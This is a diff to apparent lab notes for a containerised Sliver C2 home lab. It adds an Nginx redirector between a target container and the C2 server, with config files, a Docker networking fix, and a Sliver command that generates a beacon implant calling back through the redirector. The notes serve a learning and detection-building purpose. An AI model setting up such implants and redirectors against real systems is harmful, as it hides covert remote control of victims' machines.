@@ -192,10 +192,88 @@ Since this is a beacon (not an interactive session), commands are queued and onl
 - **Beacon errors are often silent**: a misconfigured C2 address doesn't throw an error, the beacon simply never checks in. `docker logs <container>` on the target often shows nothing at all, since beacons are designed to be quiet. The absence of a beacon in `beacons` is the real signal to investigate.
 - **Flag parsing**: Sliver's internal command parser doesn't support combined shorthand flags (e.g. `ls -la` fails; `ls -l` works).
 
+## Adding the Redirector
+
+With the C2 server and beacon working directly, the next step was introducing a redirector between the target and the real C2 server, so the implant never connects to `sliver-c2` directly.
+
+### Redirector configuration
+
+The redirector runs Nginx as a reverse proxy, forwarding traffic to the real C2 server.
+
+**`redirector/nginx.conf`:**
+
+    events {}
+
+    http {
+        server {
+            listen 8888;
+
+            location / {
+                proxy_pass http://sliver-c2:8888;
+                proxy_set_header Host $host;
+                proxy_set_header X-Real-IP $remote_addr;
+                proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+            }
+        }
+    }
+
+**`redirector/Dockerfile`:**
+
+    FROM nginx:alpine
+
+    COPY nginx.conf /etc/nginx/nginx.conf
+
+**Compose service**, attached to both `net-offense` and `net-c2`:
+
+    redirector:
+      build:
+        context: ./redirector
+      container_name: redirector
+      hostname: redirector
+      networks:
+        - net-offense
+        - net-c2
+      restart: unless-stopped
+
+The `target` service was moved from `net-c2` to `net-offense`, so it no longer has any direct network path to the real C2 server, only to the redirector.
+
+### Debugging: `internal: true` blocks multi-homed routing
+
+The first attempt failed with `connection refused` when the redirector tried to reach `sliver-c2`, even though both containers were confirmed to be on the same `net-c2` network with valid IPs.
+
+The root cause was the `internal: true` flag on the `net-c2` network definition. Docker blocks routing through a multi-homed container (one attached to more than one network, like the redirector) when one of its networks is marked internal. This is a Docker safeguard against accidentally bridging an internal network to the outside world through a container that has a foot in both.
+
+Removing `internal: true` from `net-c2` resolved the issue, since isolation from the host/internet was never dependent on that flag in the first place, it comes from the networks simply not being exposed to the host.
+
+### Verifying end-to-end connectivity
+
+    docker exec redirector wget -qO- http://sliver-c2:8888
+    # HTTP/1.1 404 Not Found
+
+A `404` response (rather than `connection refused`) confirmed the redirector could reach the C2 server over HTTP.
+
+### Regenerating the beacon through the redirector
+
+    generate beacon --http redirector:8888 --os linux --arch arm64 --skip-symbols --save /root/
+
+After copying the new binary into the target container and recreating it, the beacon successfully checked in through the redirector:
+
+    [server] sliver > beacons
+
+    ID         Name               Transport   Hostname   Username   Operating System
+    20025e0e   COOING_PNEUMONIA   http(s)     target     root       linux/arm64
+
+This confirmed the full offensive chain, now including the redirector:
+
+    Target (net-offense) -> Redirector (net-offense + net-c2) -> Sliver C2 (net-c2)
+
+The real C2 server is no longer directly reachable from the target container.
+
 ## Status
 
 - Sliver C2 server running in an isolated container.
 - HTTP listener active on port 8888.
-- Beacon implant generated and successfully checking in from a separate target container.
+- Redirector in place, decoupling the target from the real C2 server.
+- Beacon implant successfully checking in through the full chain: target -> redirector -> C2.
 
-Next: configure beacon jitter and a malleable C2 profile, then introduce the redirector.
+Next: configure beacon jitter and a malleable C2 profile, then begin building the detection engine.
